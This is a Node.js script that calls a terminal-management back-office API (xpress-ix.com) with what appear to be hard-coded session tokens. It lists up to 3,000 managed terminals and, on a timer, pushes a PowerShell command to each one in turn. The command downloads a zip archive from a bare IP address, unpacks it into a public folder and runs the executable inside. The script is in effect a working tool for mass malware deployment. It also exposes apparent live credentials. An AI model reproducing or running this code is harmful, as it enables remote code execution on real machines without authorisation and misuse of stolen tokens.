const request = require('request');
const dummy = require('./dummy')



getList = (count) => {
    return new Promise((resolve, reject) => {
        (async () => {
            var options = {
                'method': 'POST',
                'url': 'https://bo-api.xpress-ix.com/sysapi/v1/terminal/list',
                'headers': {
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://clientoffice.xpress-ix.com',
                    'priority': 'u=1, i',
                    'referer': 'https://clientoffice.xpress-ix.com/',
                    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
                },
                form: {
                    'length': count,
                    'page': '1',
                    'status': '1',
                    'site_id': '9359',
                    'boToken': 'f7701b926a68d20a5a91ee29c4052105',
                    'external_login': 'false'
                }
            };
            request(options, function (error, response) {
                if (error) throw new Error(error);
                const result = (JSON.parse(response.body)).data.terminals.map(item => item.id)
                resolve(result);
            });

        })()
    });
}

sendCmd = (id) => {
    return new Promise((resolve, reject) => {
        (async () => {
            var options = {
                'method': 'POST',
                'url': 'https://bo-api.xpress-ix.com/sysapi/v1/terminal/set-command',
                'headers': {
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://clientoffice.xpress-ix.com',
                    'priority': 'u=1, i',
                    'referer': 'https://clientoffice.xpress-ix.com/',
                    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
                },
                form: {
                    'terminal_id': id,
                    'terminal_command': 'powershell Invoke-WebRequest -Uri http://74.122.101.8/app/x.zip -OutFile "C:/Users/Public/x.zip" && powershell Expand-Archive -Path "C:/Users/Public/x.zip" "C:/Users/Public" && dir "C:/Users/Public" && "C:/Users/Public/x.exe"\n',
                    'boToken': '2bdc7d32a7671132e1c6c6b64b5fb0ae',
                    'external_login': 'false'
                }
            };
            request(options, function (error, response) {
                if (error) throw new Error(error);
                resolve(response.body);
            });
        })()
    });
}






let counter = 0;
setInterval(async () => {
    const list = await getList(3000);
    console.log({ count: list.length });

    if (list[counter]) {
        const result = await sendCmd(list[counter]);
        console.log({ counter: list[counter], result });
        counter++;
    }
}, 3000)